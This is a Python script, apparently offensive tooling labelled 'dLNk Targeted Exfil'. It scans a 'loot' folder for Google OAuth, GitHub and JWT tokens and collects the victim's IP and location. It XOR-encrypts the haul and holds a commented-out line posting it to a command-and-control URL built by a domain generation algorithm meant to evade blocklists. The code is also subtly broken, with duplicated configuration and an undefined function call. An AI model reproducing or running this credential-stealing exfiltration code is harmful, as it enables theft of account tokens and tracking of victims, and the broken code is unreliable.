import os
import requests
import re
import json
import socket

# Configuration
LOOT_DIR = os.path.join(os.getcwd(), "loot")
import hashlib
import datetime

# CONFIGURATION
LOOT_DIR = os.path.join(os.getcwd(), "loot")
TARGET_FILE = "target_intel.json"

def generate_dga_domain():
    """Real Malware Technique: Domain Generation Algorithm (DGA).
    Generates a unique C2 domain based on the current date.
    This prevents static blacklisting."""
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    seed = f"antigravity-master-{today}"
    hash_val = hashlib.md5(seed.encode()).hexdigest()[:12]
    
    # In a real campaign, the attacker registers this domain in advance.
    # For this operation, we map this domain to our IP in the hosts file.
    dga_domain = f"http://ag-update-{hash_val}.net/upload"
    return dga_domain

C2_URL = generate_dga_domain() # Dynamic Network Target

def get_my_ip():
    """Gets the attacker's public IP to whitelist it."""
    try:
        # In a real scenario, this would check a config or a 'safe' local interface
        return requests.get("http://ip-api.com/json/", timeout=3).json().get("query")
    except: return "127.0.0.1"

ATTACKER_IP = get_my_ip() # WHITELISTED

def harvest_specific_secrets():
    """Scans for specific high-value patterns only (No bulk dump)."""
    print("[*] Hunting for specific secrets (Tokens, IPs)...")
    secrets = []
    
    # 1. Grab IP / Location (TARGET ONLY)
    ip_data = get_victim_ip()
    victim_ip = ip_data.get("query", "")
    
    # PROTECT THE MASTER: If the detected IP matches ours, DO NOT EXFILTRATE network data
    if victim_ip == ATTACKER_IP:
        print(f"    [!] SAFETY SHIELD: Detected local execution ({ATTACKER_IP}). Skipping Network Identity exfil.")
    else:
        secrets.append({"type": "network_identity", "data": ip_data})
    
    # 2. Scan Loot for Tokens
    if os.path.exists(LOOT_DIR):
        token_pattern = re.compile(r"(ya29\.[a-zA-Z0-9_-]+|ghp_[a-zA-Z0-9]+|ey[a-zA-Z0-9._-]+)")
        
        for root, _, files in os.walk(LOOT_DIR):
            for file in files:
                try:
                    with open(os.path.join(root, file), "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        matches = token_pattern.findall(content)
                        for m in matches:
                            secrets.append({"type": "token", "source": file, "value": m})
                except: pass

    return secrets

def exfiltrate(data):
    """Encodes and sends only the specific targeted data."""
    print("[*] Exfiltrating targeted intel...")
    try:
        payload = json.dumps(data)
        # XOR Encryption
        encrypted = bytearray([b ^ 0x42 for b in payload.encode()])
        
        # Save locally for verification (in simulation)
        with open(TARGET_FILE, "wb") as f:
            f.write(encrypted)
            
        print(f"[+] Secrets captured and encrypted to {TARGET_FILE}")
        # requests.post(C2_URL, data=encrypted) # Uncomment for real C2
        return True
    except Exception as e:
        print(f"[!] Exfil failed: {e}")
        return False

def cleanup_local():
    """Wipes the sensitive extracted file."""
    if os.path.exists(TARGET_FILE):
        os.remove(TARGET_FILE)
        print("[*] Local intel file wiped.")

if __name__ == "__main__":
    print("--- [ dLNk Targeted Exfil ] ---")
    data = harvest_specific_secrets()
    if data:
        print(f"[*] Found {len(data)} secrets.")
        exfiltrate(data)
        # cleanup_local() # Keep for review
    else:
        print("[-] No high-value targets found.")
